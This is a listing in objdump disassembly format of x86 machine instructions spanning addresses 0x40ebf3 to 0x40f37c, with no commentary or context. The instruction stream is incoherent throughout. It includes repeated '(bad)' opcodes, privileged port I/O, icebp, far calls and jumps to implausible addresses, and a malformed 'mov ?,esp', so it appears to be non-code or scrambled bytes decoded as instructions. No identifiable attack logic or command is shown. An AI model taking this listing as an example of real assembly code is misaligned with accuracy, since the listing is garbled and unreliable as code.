  40ebf3:	xor    BYTE PTR [edx-0xc477ab4],0xd9
  40ebfa:	and    edx,DWORD PTR [edi+edi*8+0x5b]
  40ebfe:	or     dl,bl
  40ec00:	mov    ds:0x3678e9a8,al
  40ec05:	ja     0x40ec1e
  40ec07:	adc    DWORD PTR [eax-0x7de72589],0xebfaf09e
  40ec11:	das    
  40ec12:	lea    ebx,[esp+esi*4]
  40ec15:	pop    ss
  40ec16:	int    0xb4
  40ec18:	dec    edi
  40ec19:	add    eax,0xd48bae25
  40ec1e:	rcl    BYTE PTR [edi-0x70691b32],1
  40ec24:	les    ebx,FWORD PTR [esi+0x6e]
  40ec27:	xor    eax,0xea6c872e
  40ec2c:	pop    ebx
  40ec2d:	adc    BYTE PTR [edi],0x12
  40ec30:	inc    edi
  40ec31:	pop    esp
  40ec32:	loop   0x40ec95
  40ec34:	lods   al,BYTE PTR ds:[esi]
  40ec35:	xor    al,0x68
  40ec37:	lods   al,BYTE PTR ds:[esi]
  40ec38:	mov    ch,0xbb
  40ec3a:	test   BYTE PTR ds:0xfc81bb02,al
  40ec40:	shr    edx,0x25
  40ec43:	icebp  
  40ec44:	mov    dl,0x4
  40ec46:	scas   al,BYTE PTR es:[edi]
  40ec47:	pop    ds
  40ec48:	xchg   edi,eax
  40ec49:	dec    edi
  40ec4a:	dec    esp
  40ec4b:	push   0x38
  40ec4d:	push   edi
  40ec4e:	adc    ebp,DWORD PTR [ecx+0x6bb16c2f]
  40ec54:	xor    DWORD PTR [eax],eax
  40ec56:	aaa    
  40ec57:	stc    
  40ec58:	into   
  40ec59:	repnz cmc 
  40ec5b:	mov    esi,0xd7616622
  40ec60:	mov    dl,cl
  40ec62:	into   
  40ec63:	out    0x5b,eax
  40ec65:	retf   0x6811
  40ec68:	inc    esi
  40ec69:	sti    
  40ec6a:	mov    eax,DWORD PTR [esi-0x6c]
  40ec6d:	jg     0x40ec5b
  40ec6f:	ret    0x7f4a
  40ec72:	hlt    
  40ec73:	sbb    eax,0xa9f30fff
  40ec78:	mov    ebp,0x6be1b149
  40ec7d:	xchg   esp,eax
  40ec7e:	cwde   
  40ec7f:	or     ebp,DWORD PTR [edx+0x6a]
  40ec82:	aaa    
  40ec83:	inc    ecx
  40ec84:	imul   ebp,DWORD PTR [esi-0x725ecb5],0x9da8d6fc
  40ec8e:	cwde   
  40ec8f:	add    BYTE PTR [ebp+0x59],bh
  40ec92:	mov    ds:0xa41d6cf6,eax
  40ec97:	add    BYTE PTR [edi-0x5],ah
  40ec9a:	or     DWORD PTR [ecx],ebx
  40ec9c:	pop    ds
  40ec9d:	fs push ebp
  40ec9f:	loope  0x40ece5
  40eca1:	push   eax
  40eca2:	ins    DWORD PTR es:[edi],dx
  40eca3:	cmp    bh,BYTE PTR [eax]
  40eca5:	inc    esi
  40eca6:	xchg   edi,eax
  40eca7:	add    al,BYTE PTR [edi-0x1d]
  40ecaa:	cmc    
  40ecab:	stos   BYTE PTR es:[edi],al
  40ecac:	out    dx,eax
  40ecad:	sbb    eax,0xe777064e
  40ecb2:	mov    ecx,0x2095d9b5
  40ecb7:	nop
  40ecb8:	fldcw  WORD PTR [ebp+edi*1-0x6a966e51]
  40ecbf:	push   edi
  40ecc0:	test   al,0x3e
  40ecc2:	ret    
  40ecc3:	jmp    0xe106d460
  40ecc8:	test   BYTE PTR [eax+0x3f],ch
  40eccb:	and    eax,0x9b0bd95d
  40ecd0:	dec    esi
  40ecd1:	sub    BYTE PTR [ebx-0x38cc5288],dh
  40ecd7:	(bad)  
  40ecd8:	aaa    
  40ecd9:	add    esi,DWORD PTR [eax+0x2e996b19]
  40ecdf:	inc    edi
  40ece0:	mov    bl,0x11
  40ece2:	test   bl,dl
  40ece4:	outs   dx,BYTE PTR ds:[esi]
  40ece5:	retf   0x9bec
  40ece8:	add    eax,0xb1268ac7
  40eced:	fbstp  TBYTE PTR es:[ebx]
  40ecf0:	mov    dh,BYTE PTR [ebx+0x5540d5bb]
  40ecf6:	cld    
  40ecf7:	test   DWORD PTR [ebp-0x40],ecx
  40ecfa:	cmc    
  40ecfb:	(bad)  
  40ecfc:	mov    ds:0x19c62eba,eax
  40ed01:	xchg   esp,eax
  40ed02:	sub    al,0x12
  40ed04:	xor    DWORD PTR [eax-0x1a0d8ae2],esp
  40ed0a:	rcl    DWORD PTR [eax+0x54],cl
  40ed0d:	push   0xff2f1a6f
  40ed12:	push   edx
  40ed13:	pop    es
  40ed14:	(bad)  
  40ed15:	std    
  40ed16:	or     ebp,DWORD PTR [edi]
  40ed18:	fist   WORD PTR [esi]
  40ed1a:	sbb    DWORD PTR [ebx],edi
  40ed1c:	pop    ds
  40ed1d:	or     BYTE PTR [eax+0x24e88f59],0x78
  40ed24:	fld    TBYTE PTR [esi-0x35]
  40ed27:	fdiv   DWORD PTR [esi+eiz*4+0x14c5937a]
  40ed2e:	mov    bl,0xd1
  40ed30:	inc    esi
  40ed31:	add    dl,al
  40ed33:	rol    esi,0x5b
  40ed36:	in     al,dx
  40ed37:	fdiv   QWORD PTR [edx]
  40ed39:	mov    edx,0x5f334a91
  40ed3e:	das    
  40ed3f:	xor    al,0xd8
  40ed41:	loope  0x40ed3d
  40ed43:	sbb    ah,ah
  40ed45:	inc    esp
  40ed46:	xchg   edx,eax
  40ed47:	scas   al,BYTE PTR es:[edi]
  40ed48:	les    edi,FWORD PTR ds:[edi+ebx*2+0x3eec7d96]
  40ed50:	pop    edi
  40ed51:	imul   BYTE PTR [ebx]
  40ed53:	mov    ecx,0x5b0943ca
  40ed58:	xchg   DWORD PTR [ebx],edx
  40ed5a:	hlt    
  40ed5b:	mov    edi,0xf6eaaad3
  40ed60:	in     al,0x47
  40ed62:	sub    DWORD PTR [edi],ecx
  40ed64:	or     edi,esi
  40ed66:	mov    eax,ds:0xd6957f5a
  40ed6b:	jne    0x40ed7e
  40ed6d:	cli    
  40ed6e:	xchg   DWORD PTR [edx+ebp*4+0x69],edx
  40ed72:	xor    al,0xc9
  40ed74:	lock and ebp,DWORD PTR [esi+0x3fbce552]
  40ed7b:	cmp    eax,0x4fb1a669
  40ed80:	inc    esi
  40ed81:	nop
  40ed82:	call   0x74fb47f7
  40ed87:	int3   
  40ed88:	iret   
  40ed89:	ins    BYTE PTR es:[edi],dx
  40ed8a:	fst    DWORD PTR [ebp+0x5c]
  40ed8d:	shr    DWORD PTR [edi],cl
  40ed8f:	in     al,dx
  40ed90:	mov    gs,ecx
  40ed92:	fisttp DWORD PTR [edi-0x2d]
  40ed95:	sub    BYTE PTR [eax*1+0x13a23f01],0x1
  40ed9d:	mov    ch,0x26
  40ed9f:	shr    BYTE PTR [edx-0x81f6625],0xf6
  40eda6:	lods   al,BYTE PTR ds:[esi]
  40eda7:	sbb    eax,0x7bd97a19
  40edac:	outs   dx,DWORD PTR ds:[esi]
  40edad:	push   ecx
  40edae:	and    dl,cl
  40edb0:	scas   eax,DWORD PTR es:[edi]
  40edb1:	adc    ebp,DWORD PTR [edi+0x56]
  40edb4:	sub    eax,0xc7af95af
  40edb9:	cmp    al,0x97
  40edbb:	xchg   edx,eax
  40edbc:	push   ds
  40edbd:	mov    ebp,0x6c2604b0
  40edc2:	dec    ebx
  40edc3:	add    DWORD PTR ds:0x318271a9,edi
  40edc9:	loop   0x40ed7f
  40edcb:	mov    ebp,0x74e4a168
  40edd0:	jnp    0x40ed7c
  40edd2:	shl    BYTE PTR [ebp+0x1cbad70a],0x32
  40edd9:	(bad)  
  40edda:	dec    edi
  40eddb:	mov    esi,0x92233ba0
  40ede0:	cdq    
  40ede1:	or     BYTE PTR [ecx-0x765990bc],al
  40ede7:	ins    BYTE PTR es:[edi],dx
  40ede8:	cmp    ah,al
  40edea:	push   cs
  40edeb:	pusha  
  40edec:	aad    0x69
  40edee:	stos   BYTE PTR es:[edi],al
  40edef:	push   es
  40edf0:	dec    eax
  40edf1:	lods   al,BYTE PTR ds:[esi]
  40edf2:	xor    edi,DWORD PTR [edx+edi*4-0x3960ad9]
  40edf9:	bound  ebx,QWORD PTR [edi]
  40edfb:	(bad)  
  40edfc:	fstp   TBYTE PTR [ebp+0x21]
  40edff:	ret    
  40ee00:	das    
  40ee01:	outs   dx,DWORD PTR ds:[esi]
  40ee02:	xchg   BYTE PTR [ecx+0x2929c85b],bh
  40ee08:	out    dx,eax
  40ee09:	xchg   dl,bl
  40ee0b:	fwait
  40ee0c:	outs   dx,DWORD PTR ds:[esi]
  40ee0d:	jecxz  0x40ee67
  40ee0f:	sbb    al,0x98
  40ee11:	push   es
  40ee12:	sub    dl,bl
  40ee14:	popf   
  40ee15:	inc    esi
  40ee16:	mov    ebp,0xdc66586e
  40ee1b:	pop    ecx
  40ee1c:	cmp    eax,0x44b4f3ef
  40ee21:	in     eax,dx
  40ee22:	push   0xcadee78b
  40ee27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee28:	adc    DWORD PTR [esi-0x1d],eax
  40ee2b:	call   0xe362:0x40a2135e
  40ee32:	jo     0x40ee0c
  40ee34:	(bad)  
  40ee35:	imul   ebx,DWORD PTR [esi],0xffffffa2
  40ee38:	call   0x756c2b0c
  40ee3d:	xchg   ebx,eax
  40ee3e:	(bad)  
  40ee3f:	repz push ebx
  40ee41:	add    eax,0x7c001e2d
  40ee46:	ins    BYTE PTR es:[edi],dx
  40ee47:	mov    ecx,0x4e1f502b
  40ee4c:	(bad)  
  40ee4d:	and    ah,BYTE PTR [esi+0x4a]
  40ee50:	fs icebp 
  40ee52:	pop    edi
  40ee53:	push   esi
  40ee54:	mov    bl,0x9a
  40ee56:	sub    ebp,DWORD PTR [ecx]
  40ee58:	mov    esi,0x238ec9dc
  40ee5d:	mov    ch,0xd9
  40ee5f:	mov    BYTE PTR [ecx+0x71bdec68],bh
  40ee65:	cmp    al,0xf8
  40ee67:	sti    
  40ee68:	jmp    0x9e6f8b5
  40ee6d:	daa    
  40ee6e:	int    0x3b
  40ee70:	test   eax,0x58cc26dd
  40ee75:	xchg   BYTE PTR [ebp+0x70],dl
  40ee78:	pop    edx
  40ee79:	std    
  40ee7a:	nop
  40ee7b:	rcr    DWORD PTR [esi-0x2c2f539a],cl
  40ee81:	call   0xcd8bc167
  40ee86:	xchg   edx,eax
  40ee87:	cmc    
  40ee88:	in     eax,dx
  40ee89:	ss jno 0x40ee61
  40ee8c:	fwait
  40ee8d:	and    BYTE PTR [ebx-0x1b08b46d],dh
  40ee93:	and    eax,0x84a05fd1
  40ee98:	mov    esp,0x36d1b35b
  40ee9d:	je     0x40ee65
  40ee9f:	jmp    FWORD PTR [esi]
  40eea1:	push   es
  40eea2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eea3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eea4:	ror    cl,1
  40eea6:	sub    ebx,DWORD PTR [edi-0x21]
  40eea9:	or     eax,0x19c2f935
  40eeae:	jns    0x40ef12
  40eeb0:	sub    bh,cl
  40eeb2:	imul   esi,edx,0xe782e045
  40eeb8:	dec    ebp
  40eeb9:	inc    eax
  40eeba:	aaa    
  40eebb:	jns    0x40eed3
  40eebd:	mov    ebx,0x7629a2e0
  40eec2:	push   es
  40eec3:	inc    edx
  40eec4:	dec    eax
  40eec5:	jne    0x40eee7
  40eec7:	xchg   edx,eax
  40eec8:	pop    esp
  40eec9:	or     esi,eax
  40eecb:	cdq    
  40eecc:	dec    ecx
  40eecd:	je     0x40eeca
  40eecf:	and    BYTE PTR [edx+ecx*8-0x5bbb3370],bl
  40eed6:	fsubr  DWORD PTR [esi]
  40eed8:	add    DWORD PTR [esi+0x604c948],ebx
  40eede:	pop    ss
  40eedf:	jge    0x40ee73
  40eee1:	xchg   edi,eax
  40eee2:	mov    ecx,0xa9104f83
  40eee7:	or     ecx,edi
  40eee9:	aaa    
  40eeea:	jne    0x40ef2d
  40eeec:	gs cli 
  40eeee:	jecxz  0x40ef3d
  40eef0:	xchg   edi,eax
  40eef1:	frstor [ebx]
  40eef3:	fmul   QWORD PTR [ecx-0x6d]
  40eef6:	cs push esi
  40eef8:	out    0x7d,al
  40eefa:	popf   
  40eefb:	jb     0x40eeae
  40eefd:	add    al,0x7a
  40eeff:	(bad)  
  40ef00:	adc    eax,0xc5397735
  40ef05:	call   0x27e0:0x542f5813
  40ef0c:	int3   
  40ef0d:	cmp    bl,BYTE PTR [ebx-0x66]
  40ef10:	outs   dx,DWORD PTR ds:[esi]
  40ef11:	call   0x5836e9d8
  40ef16:	in     al,0x92
  40ef18:	xchg   esi,eax
  40ef19:	adc    esp,DWORD PTR [edi-0x56]
  40ef1c:	xor    ah,BYTE PTR [esi]
  40ef1e:	in     eax,0xa4
  40ef20:	mov    eax,0xbb6ffbb1
  40ef25:	(bad)  
  40ef26:	xchg   edi,eax
  40ef27:	hlt    
  40ef28:	xchg   edx,eax
  40ef29:	sub    eax,0xb2961a92
  40ef2e:	sbb    eax,0x4eeb75dd
  40ef33:	xchg   esi,eax
  40ef34:	sti    
  40ef35:	out    0xea,al
  40ef37:	pop    esi
  40ef38:	pop    ebx
  40ef39:	jae    0x40eed1
  40ef3b:	ret    0x58fc
  40ef3e:	sub    eax,0x9d033402
  40ef43:	adc    bh,BYTE PTR ds:0xaff957b4
  40ef49:	call   0x47ea52f1
  40ef4e:	cld    
  40ef4f:	aas    
  40ef50:	adc    WORD PTR [edx+0x7ea6fbc0],si
  40ef57:	fnstsw WORD PTR [edi]
  40ef59:	push   edx
  40ef5a:	inc    esp
  40ef5b:	mov    cl,0xc8
  40ef5d:	xor    edx,DWORD PTR [edx+0x1c05cd66]
  40ef63:	cmp    al,0xbf
  40ef65:	adc    BYTE PTR [ebx-0x32c257eb],bl
  40ef6b:	test   bl,bh
  40ef6d:	push   esp
  40ef6e:	and    eax,0xe03be1e5
  40ef73:	inc    esp
  40ef74:	idiv   DWORD PTR [eax+0x31c14725]
  40ef7a:	dec    edi
  40ef7b:	and    eax,0xf45925df
  40ef80:	and    DWORD PTR [eax+0x2af009b0],edi
  40ef86:	test   al,0x93
  40ef88:	in     al,dx
  40ef89:	or     DWORD PTR [eax+esi*2],0xffffffda
  40ef8d:	ror    DWORD PTR [esi+0x2af8a4ce],0xff
  40ef94:	mov    dh,0xde
  40ef96:	or     ch,bh
  40ef98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef99:	in     al,0xc6
  40ef9b:	aaa    
  40ef9c:	push   ss
  40ef9d:	gs mov dh,0x9e
  40efa0:	fdivp  st(3),st
  40efa2:	loope  0x40ef72
  40efa4:	inc    esp
  40efa5:	aam    0xaf
  40efa7:	test   BYTE PTR [esp+esi*2-0x48],ah
  40efab:	dec    esp
  40efac:	push   esi
  40efad:	pop    eax
  40efae:	repz aaa 
  40efb0:	push   ss
  40efb1:	add    eax,0x3c88efe3
  40efb6:	ror    DWORD PTR [edx],cl
  40efb8:	(bad)  
  40efb9:	sti    
  40efba:	add    al,0xea
  40efbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efbd:	cmp    al,0x21
  40efbf:	xchg   esp,eax
  40efc0:	cmp    edi,edi
  40efc2:	dec    ebp
  40efc3:	dec    edi
  40efc4:	dec    eax
  40efc5:	cmp    al,0x88
  40efc7:	rcl    BYTE PTR [eax-0x3ca25349],0x23
  40efce:	les    ebx,FWORD PTR [esi-0x4a]
  40efd1:	fild   DWORD PTR [edi]
  40efd3:	pop    edx
  40efd4:	xchg   edi,eax
  40efd5:	sbb    eax,0x68c26f4f
  40efda:	outs   dx,BYTE PTR ds:[esi]
  40efdb:	inc    ebp
  40efdc:	mov    ch,BYTE PTR [edi-0x6a]
  40efdf:	int3   
  40efe0:	pop    ecx
  40efe1:	inc    edi
  40efe2:	add    BYTE PTR [ecx-0xa4f724f],bl
  40efe8:	xchg   ebx,eax
  40efe9:	retf   0xc8ad
  40efec:	xchg   DWORD PTR [edx],edx
  40efee:	inc    edx
  40efef:	dec    ebp
  40eff0:	outs   dx,DWORD PTR ds:[esi]
  40eff1:	idiv   BYTE PTR [edi-0x1f]
  40eff4:	test   DWORD PTR [eiz*8-0x1c3f195e],0x5a8ddd40
  40efff:	push   ecx
  40f000:	in     eax,dx
  40f001:	je     0x40f015
  40f003:	or     eax,0x7bc192a7
  40f008:	(bad)  
  40f009:	ficomp DWORD PTR [eax+0x2]
  40f00c:	xchg   ecx,eax
  40f00d:	mov    ecx,0x2bc1f2d2
  40f012:	inc    ecx
  40f013:	mov    ebp,0x4e832400
  40f018:	pop    ds
  40f019:	jp     0x40f06c
  40f01b:	push   esi
  40f01c:	test   DWORD PTR [eax+esi*1+0x2f],esi
  40f020:	sbb    edx,DWORD PTR [edx]
  40f022:	sub    DWORD PTR [esi+0x17],esi
  40f025:	test   eax,0x8a04741
  40f02a:	fild   QWORD PTR [ebx]
  40f02c:	addr16 es or ecx,edx
  40f030:	js     0x40f045
  40f032:	lea    esi,[ebp+esi*1-0x4e]
  40f036:	or     DWORD PTR [ecx+eax*8+0x1aec1e25],ecx
  40f03d:	mov    ds:0x7ea76670,al
  40f042:	cmp    eax,0x65c7e38c
  40f047:	stos   DWORD PTR es:[edi],eax
  40f048:	pop    es
  40f049:	popa   
  40f04a:	push   0xa7523869
  40f04f:	sub    DWORD PTR [bx+di],edi
  40f052:	or     DWORD PTR [esi],edx
  40f054:	and    al,0x40
  40f056:	popa   
  40f057:	dec    ebp
  40f058:	xchg   ebp,eax
  40f059:	ins    BYTE PTR es:[edi],dx
  40f05a:	(bad)  [edi-0x3360caf0]
  40f060:	add    eax,0xe21f88a2
  40f065:	nop
  40f066:	clc    
  40f067:	repz xchg edi,eax
  40f069:	add    dl,BYTE PTR [ecx+0x60]
  40f06c:	inc    esp
  40f06d:	add    eax,0xc2b3ec0c
  40f072:	adc    DWORD PTR [esi-0x50],0x67
  40f076:	dec    esi
  40f077:	cmp    edi,esi
  40f079:	ret    0x4490
  40f07c:	iret   
  40f07d:	retf   
  40f07e:	add    DWORD PTR [edi-0x2d],0xffffffbc
  40f082:	or     eax,0xa1278576
  40f087:	add    BYTE PTR [ecx-0x54d9fb99],ch
  40f08d:	xor    al,0xf2
  40f08f:	in     al,dx
  40f090:	jmp    0x40f0f1
  40f092:	jne    0x40f0a8
  40f094:	mov    ds:0xd3e357ea,eax
  40f099:	sub    eax,ebx
  40f09b:	mov    edx,0x4a752646
  40f0a0:	sahf   
  40f0a1:	pop    ss
  40f0a2:	es xor eax,0xb82f55f4
  40f0a8:	lds    edx,FWORD PTR [ecx+0xff0dad5]
  40f0ae:	aas    
  40f0af:	sar    BYTE PTR [esi+0x7],1
  40f0b2:	outs   dx,DWORD PTR ds:[esi]
  40f0b3:	push   0x60c2116c
  40f0b8:	or     bl,BYTE PTR ds:0x10181522
  40f0be:	out    0xc6,eax
  40f0c0:	jno    0x40f07a
  40f0c2:	dec    eax
  40f0c3:	pop    es
  40f0c4:	inc    esp
  40f0c5:	mov    esi,0x4fa002f1
  40f0ca:	stos   BYTE PTR es:[edi],al
  40f0cb:	jae    0x40f052
  40f0cd:	mov    ds:0x2ae4c38,eax
  40f0d2:	push   edx
  40f0d3:	dec    ebp
  40f0d4:	pushf  
  40f0d5:	push   ebx
  40f0d6:	push   0xffffff96
  40f0d8:	dec    eax
  40f0d9:	xor    DWORD PTR [ebp+0x1190465b],ebp
  40f0df:	out    0x62,al
  40f0e1:	jb     0x40f11f
  40f0e3:	mov    ah,0x9b
  40f0e5:	mov    al,ds:0x7f6f90f4
  40f0ea:	js     0x40f15d
  40f0ec:	jmp    DWORD PTR [edi+0x2b]
  40f0ef:	in     ax,dx
  40f0f1:	ss jle 0x40f10e
  40f0f4:	fs call 0xdc76:0x6fe4a71a
  40f0fc:	lods   al,BYTE PTR ds:[esi]
  40f0fd:	retf   0xa1d2
  40f100:	ret    
  40f101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f102:	xor    al,0x18
  40f104:	in     al,dx
  40f105:	scas   al,BYTE PTR es:[edi]
  40f106:	jo     0x40f166
  40f108:	out    dx,al
  40f109:	add    al,0xe3
  40f10b:	cmp    dl,0xde
  40f10e:	imul   BYTE PTR [ecx+0x33f75a8]
  40f114:	push   edx
  40f115:	mov    eax,0xae357463
  40f11a:	xor    al,0xdd
  40f11c:	int    0xbf
  40f11e:	and    eax,0xfc9c7337
  40f123:	xchg   ecx,eax
  40f124:	hlt    
  40f125:	push   cs
  40f126:	jbe    0x40f164
  40f128:	add    BYTE PTR [eax-0x64fdb2ae],bl
  40f12e:	jl     0x40f0fd
  40f130:	loope  0x40f183
  40f132:	push   ebx
  40f133:	cld    
  40f134:	push   ebx
  40f135:	inc    esp
  40f136:	push   ds
  40f137:	out    0x42,eax
  40f139:	lods   eax,DWORD PTR ds:[esi]
  40f13a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f13b:	stos   BYTE PTR es:[edi],al
  40f13c:	cwde   
  40f13d:	inc    esp
  40f13e:	call   0xd70d279d
  40f143:	sub    dh,dh
  40f145:	dec    edi
  40f146:	xchg   DWORD PTR [edi+ecx*4-0x42cef0c0],ebp
  40f14d:	or     eax,0x7edb718b
  40f152:	sbb    esi,edx
  40f154:	mov    DWORD PTR [edx],esi
  40f156:	imul   ebx,DWORD PTR ds:0x48925c81,0xf33e12e3
  40f160:	loopne 0x40f1da
  40f162:	mov    eax,0x50e1490b
  40f167:	inc    ecx
  40f168:	lock pop DWORD PTR [edx+0x7118cac0]
  40f16f:	inc    ebx
  40f170:	mov    eax,0x7610c407
  40f175:	mov    ebx,0xcf47b5e
  40f17a:	jmp    0x40f124
  40f17c:	sti    
  40f17d:	push   esi
  40f17e:	jb     0x40f123
  40f180:	or     al,0x45
  40f182:	imul   ebx,edi,0x15
  40f185:	mov    ebx,0x9c3b93cf
  40f18a:	adc    DWORD PTR [esi],0xffffffcf
  40f18d:	pop    edx
  40f18e:	xlat   BYTE PTR ds:[bx]
  40f190:	push   cs
  40f191:	pop    DWORD PTR [ebx]
  40f193:	mov    ebx,0x1fbf285e
  40f198:	mov    esi,ebp
  40f19a:	xchg   esp,eax
  40f19b:	and    al,0xc9
  40f19d:	nop
  40f19e:	sbb    BYTE PTR [eax-0x58696317],ch
  40f1a4:	add    esp,edx
  40f1a6:	inc    ebx
  40f1a7:	and    BYTE PTR [eax+0x73],0x2
  40f1ab:	ret    
  40f1ac:	mov    eax,ds:0x6a14ab6a
  40f1b1:	test   BYTE PTR [ecx+0x1b7fe2e8],al
  40f1b7:	shl    BYTE PTR [ebx],0x44
  40f1ba:	retf   
  40f1bb:	je     0x40f183
  40f1bd:	push   edx
  40f1be:	push   ebp
  40f1bf:	pop    ecx
  40f1c0:	xor    DWORD PTR [edi+eiz*1+0x36],ecx
  40f1c4:	jecxz  0x40f215
  40f1c6:	sub    dh,cl
  40f1c8:	xchg   ebp,eax
  40f1c9:	jle    0x40f17f
  40f1cb:	mov    ch,0xac
  40f1cd:	add    eax,0x824d4a23
  40f1d2:	adc    al,0xc8
  40f1d4:	je     0x40f170
  40f1d6:	xchg   esp,eax
  40f1d7:	cmp    eax,0xa63cb5ae
  40f1dc:	cli    
  40f1dd:	pushf  
  40f1de:	icebp  
  40f1df:	icebp  
  40f1e0:	jecxz  0x40f233
  40f1e2:	jecxz  0x40f17d
  40f1e4:	lock loopne 0x40f1bc
  40f1e7:	aad    0xbc
  40f1e9:	xchg   ebx,eax
  40f1ea:	jmp    0x40f180
  40f1ec:	push   ds
  40f1ed:	mov    al,0x6f
  40f1ef:	sub    eax,0x2e4b7823
  40f1f4:	mov    ?,esp
  40f1f6:	test   dh,ch
  40f1f8:	out    0xbd,al
  40f1fa:	cmp    ah,BYTE PTR [ebp-0x1d]
  40f1fd:	pop    eax
  40f1fe:	inc    esi
  40f1ff:	scas   eax,DWORD PTR es:[edi]
  40f200:	ja     0x40f27b
  40f202:	pop    ss
  40f203:	pop    edi
  40f204:	ins    DWORD PTR es:[edi],dx
  40f205:	mov    eax,ds:0x127e9508
  40f20a:	pop    esp
  40f20b:	das    
  40f20c:	adc    al,0xb7
  40f20e:	xchg   BYTE PTR [eax+0x9a7d109],ah
  40f214:	adc    eax,0xecd54fb8
  40f219:	dec    edi
  40f21a:	(bad)  
  40f21b:	mov    ecx,0x2cf973b2
  40f220:	pusha  
  40f221:	sub    edi,esi
  40f223:	xchg   esp,eax
  40f224:	push   edi
  40f225:	mov    esp,0xa99cd7a7
  40f22a:	lods   eax,DWORD PTR ds:[esi]
  40f22b:	xchg   ecx,eax
  40f22c:	lahf   
  40f22d:	adc    dl,bl
  40f22f:	and    eax,0x879ef874
  40f234:	test   al,bh
  40f236:	in     al,0x78
  40f238:	dec    eax
  40f239:	std    
  40f23a:	adc    eax,0x6359187e
  40f23f:	xor    BYTE PTR [ecx],dl
  40f241:	test   al,0xe0
  40f243:	inc    esp
  40f244:	or     edx,esp
  40f246:	mov    dh,0x6b
  40f248:	inc    edx
  40f249:	out    0xb7,al
  40f24b:	inc    ecx
  40f24d:	adc    ebp,DWORD PTR [ebx]
  40f24f:	pop    ecx
  40f250:	pusha  
  40f251:	push   es
  40f252:	mov    ecx,ebp
  40f254:	dec    eax
  40f255:	and    BYTE PTR [esi+edi*8+0x2],bh
  40f259:	mov    ebx,esi
  40f25b:	loope  0x40f2bd
  40f25d:	inc    esp
  40f25e:	mov    esi,0x7b0148a3
  40f263:	jo     0x40f248
  40f265:	lahf   
  40f266:	fwait
  40f267:	or     bl,BYTE PTR [edx]
  40f269:	(bad)  
  40f26a:	adc    DWORD PTR [edx],ebp
  40f26c:	shl    dh,cl
  40f26e:	sub    BYTE PTR [esi],bl
  40f270:	dec    esp
  40f271:	or     eax,0x431e1576
  40f276:	mov    esp,DWORD PTR [ecx]
  40f278:	dec    edi
  40f279:	xor    edx,DWORD PTR [edi+0x3905e0b6]
  40f27f:	mov    al,ds:0x8fd86306
  40f284:	push   edi
  40f285:	pop    gs
  40f287:	push   eax
  40f288:	out    dx,eax
  40f289:	add    dl,dh
  40f28b:	xor    ebx,DWORD PTR [edx]
  40f28d:	sub    al,0x97
  40f28f:	jo     0x40f246
  40f291:	jb     0x40f286
  40f293:	mov    al,ds:0xc9520f5b
  40f298:	jno    0x40f30f
  40f29a:	daa    
  40f29b:	cmp    al,0x49
  40f29d:	pop    ds
  40f29e:	dec    edi
  40f29f:	jbe    0x40f2ce
  40f2a1:	sbb    esp,0x58
  40f2a4:	xor    ebp,DWORD PTR [edx+0x63]
  40f2a7:	adc    edx,ecx
  40f2a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2aa:	mov    ah,0xed
  40f2ac:	sti    
  40f2ad:	xor    al,0x1d
  40f2af:	shl    DWORD PTR [ebx+0x64513ab9],cl
  40f2b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2b6:	stos   DWORD PTR es:[edi],eax
  40f2b7:	es in  al,0xb5
  40f2ba:	or     BYTE PTR [esi-0x4c],0x3f
  40f2be:	sbb    al,0x11
  40f2c0:	cmp    al,0x19
  40f2c2:	sub    DWORD PTR [esi-0x43],edx
  40f2c5:	push   ebp
  40f2c6:	test   eax,0x27728372
  40f2cb:	push   0xfffffff4
  40f2cd:	or     ah,bh
  40f2cf:	mov    ds:0x88789d2,al
  40f2d4:	dec    ebx
  40f2d5:	daa    
  40f2d6:	into   
  40f2d7:	pop    ecx
  40f2d8:	push   0xe75f2de5
  40f2dd:	add    eax,0x9934b914
  40f2e2:	or     eax,0xfd16979f
  40f2e7:	sbb    al,0x1f
  40f2e9:	std    
  40f2ea:	xor    dl,al
  40f2ec:	xchg   ecx,eax
  40f2ed:	inc    edx
  40f2ee:	mov    eax,ds:0x450c0dc6
  40f2f3:	aam    0x33
  40f2f5:	add    al,0xa6
  40f2f7:	cmp    al,0x69
  40f2f9:	jb     0x40f291
  40f2fb:	mov    ebx,0xdecb6c2a
  40f300:	shl    bh,1
  40f302:	add    edx,DWORD PTR [ecx-0x70]
  40f305:	adc    eax,0x64a07a11
  40f30a:	data16 cs daa 
  40f30d:	sub    eax,0x63bf5162
  40f312:	jns    0x40f37e
  40f314:	or     ecx,esp
  40f316:	adc    esp,edx
  40f318:	mov    eax,ds:0x256a6829
  40f31d:	mov    eax,ds:0xed1cad2a
  40f322:	fsubp  st(2),st
  40f324:	pop    esi
  40f325:	inc    ebx
  40f326:	stc    
  40f327:	lock or dx,0x87ad
  40f32d:	push   esp
  40f32e:	sbb    BYTE PTR [esi-0x72c5dba7],bl
  40f334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f335:	int3   
  40f336:	out    0x24,al
  40f338:	cld    
  40f339:	mov    BYTE PTR [edi-0x3e],cl
  40f33c:	loopne 0x40f38b
  40f33e:	cli    
  40f33f:	jg     0x40f2f4
  40f341:	mov    BYTE PTR [ebp+0x3c],bh
  40f344:	fild   DWORD PTR [esi-0x53]
  40f347:	data16 sub BYTE PTR [esi],dl
  40f34a:	push   cs
  40f34b:	cmp    BYTE PTR [edx+0x45],cl
  40f34e:	push   esi
  40f34f:	test   BYTE PTR [edx-0x1e],al
  40f352:	in     eax,dx
  40f353:	jbe    0x40f30d
  40f355:	mov    cs:0x11feb005,al
  40f35b:	pop    ss
  40f35c:	in     al,0xc0
  40f35e:	jp     0xb4db051f
  40f364:	sub    al,0x31
  40f366:	push   edx
  40f367:	pushf  
  40f368:	jl     0x40f34a
  40f36a:	or     al,BYTE PTR [esi-0x23db8d5b]
  40f370:	sbb    DWORD PTR [edi],esi
  40f372:	fidiv  DWORD PTR [eax+0x3e]
  40f375:	ss jo  0x40f391
  40f378:	shr    BYTE PTR [edi+edx*2],0x1c
  40f37c:	scas   eax,DWORD PTR es:[edi]
